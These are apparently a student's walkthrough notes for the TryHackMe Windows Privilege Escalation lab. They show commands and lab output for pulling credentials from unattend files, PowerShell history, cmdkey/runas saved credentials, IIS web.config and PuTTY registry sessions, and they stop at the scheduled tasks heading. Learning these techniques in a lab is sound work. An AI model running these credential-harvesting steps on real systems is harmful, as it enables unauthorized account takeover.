# TRYHACKME : Windows Privilege Escalation

> Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:
> - Misconfigurations on Windows services or scheduled tasks
> - Excessive privileges assigned to our account
> - Vulnerable software
> - Missing Windows security patches

## Windows User
| User Type | Privileges |
|---|---|
| Administrator | -> have the most privileges -> can change any system configuration parameter & access any file in the system |
| Standard Users | -> can access the computer but only perform limited tasks -> these users can not make permanent or essential changes to the system and are limited to their files |

| Special Built-in Accounts | |
|---|---|
| SYSTEM / LocalSystem | -> account used by the operating system to perform internal tasks -> has full access to all files and resources available on the host -> has higher privileges than administrators |
| Local Service | -> default account -> minimum privileges -> uses anonymous connections over the network |
| Network Service | -> default account -> minimum privileges -> use the computer credentials to authenticate through the network |

<details markdown=1>
<summary><h2> 1. Harvesting Passwords from Usual Spots </h2></summary>
  
> This task will present some known places to look for passwords on a Windows system.
>
> Start the target machine. If using 
>
>> Username: `thm-unpriv` Password: `Password321`
>
> # A. Unattended Windows Installations
> When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network.
> 
>> These kinds of installations are referred to as unattended installations as they don't require user interaction.
>
> Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
>```
>    C:\Unattend.xml
>    C:\Windows\Panther\Unattend.xml
>    C:\Windows\Panther\Unattend\Unattend.xml
>    C:\Windows\system32\sysprep.inf
>    C:\Windows\system32\sysprep\sysprep.xml
> ```
>
> In these type of files, you might encounter credentials such as:
> ```
>  <Credentials>
>     <Username>Administrator</Username>
>     <Domain>thm.local</Domain>
>     <Password>MyPassword123</Password>
>  </Credentials>
> ```
> ## TARGET MACHINE:
>> ```
>> more C:\Unattend.xml => (cannot access file / file not found)
>> more C:\Windows\Panther\Unattend.xml => (cannot access file / file not found)
>> dir C:\Windows\Panther\Unattend => (empty folder)
>> more C:\Windows\system32\sysprep.inf => (cannot access file / file not found)
>> dir C:\Windows\system32\sysprep
>>       <DIR> ActionFiles
>>       <DIR> en-us
>>       <DIR> Panther
>>       sysprep.exe
>> more C:\Windows\system32\sysprep\sysprep.xml => (cannot access file / file not found)
>> ```
>> 
> 
> # B. Powershell History
> All commands run using Powershell gets stored into a file that keeps a memory of past commands.
>
>> It can later be retrieved by using the following command from a `cmd.exe` prompt (it won't work in Powershell; in order to read the file from Powershell, replace `%userprofile%` into `$Env:userprofile`)
>
> ```
> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
> ```
>
> ## TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
>> ls
>> whoami
>> whoami /priv
>> whoami /group
>> whoami /groups
>> cmdkey /?
>> cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z        // WAHH CREDENTIALS!!!
>> cmdkey /list
>> cmdkey /delete:thmdc.local
>> cmdkey /list
>> runas /?
>> ```
>
> # C. Saved Windows Credentials
> Windows allows us to use other users' credentials.
>
> The command below will list saved credentials:
> ```
> cmdkey /list
> ```
>
> Regardless of not seeing actual passwords, credentials alone are worth trying. Use them with the `runas` command and the `/savecrad` option:
> ```
> runas /savecred /user:admin cmd.exe
> ```
>
> ## TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>cmdkey /list
>>
>> Currently stored credentials:
>>
>>     Target: Domain:interactive=WPRIVESC1\mike.katz
>>     Type: Domain Password
>>     User: WPRIVESC1\mike.katz
>> 
>> C:\Users\thm-unpriv>runas /savecred /user:mike.katz cmd.exe
>> Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
>>
>> (opens another cmd terminal)
>>
>> C:\Windows\system32>whoami
>> wprivesc1\mike.katz
>> C:\Windows\system32>more C:\Users\mike.katz\Desktop\flag.txt
>> // FLAG ANSWER
>> ```
>
> # D. IIS Configuration
> Internet Information Services (IIS) is the default web server on Windows installations.
>
>> IIS websites' configuration is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms.
>
> Depending on the installed version, `web.config` can be found on ff locations:
>``` 
>    C:\inetpub\wwwroot\web.config
>    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
>```
> 
> To quickly find database connection strings on the file:
> ```
> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
> ```
> ## TARGET MACHINE
>> ```
>> C:\Users\thm-unpriv> more C:\inetpub\wwwroot\web.config => (cannot access file / file not found)
>> C:\Users\thm-unpriv> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
>>                 <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false"
>> bufferMode="Notification" name="SqlWebEventProvider"
>> type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
>>                     <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider"
>> type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral,
>> PublicKeyToken=b03f5f7f11d50a3a" />
>>     <connectionStrings>
>>         <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />  // WAHH CREDENTIALS !!!
>> </connectionStrings>
>> ```
>
> # E. Retrieve Credentials from Software: PuTTY
> **PuTTY** is an SSH client commonly found on Windows systems. It is created by Simon Tatham (his name is part of the path, not the username to retrieve password).
>
> Users can store sessions (IP, user, and other configurations) instead of having to specify a connection's parameters every single time. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
>
> To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword w/ the ff command:
> ```
> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
> ```
> Stored proxy username should also be visible after running the command above.
>
> # TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
>> HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
>> 
>>     ProxyExcludeList    REG_SZ
>>     ProxyDNS    REG_DWORD    0x1
>>     ProxyLocalhost    REG_DWORD    0x0
>>     ProxyMethod    REG_DWORD    0x0
>>     ProxyHost    REG_SZ    proxy
>>     ProxyPort    REG_DWORD    0x50
>>     ProxyUsername    REG_SZ    thom.smith
>>     ProxyPassword    REG_SZ    CoolPass2021    // WAHH CREDENTIALS !!!
>>     ProxyTelnetCommand    REG_SZ    connect %host %port\n
>>     ProxyLogToTerm    REG_DWORD    0x1
>>
>> End of search: 10 match(es) found.
>> ```
>>
</details>

<details>
<summary><h2> 2. Other Quick Wins </h2></summary>
  
> Privilege escalation is not always a challenge.
>
> Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access.
>
> # A. Scheduled Tasks
>> 
  
</details>
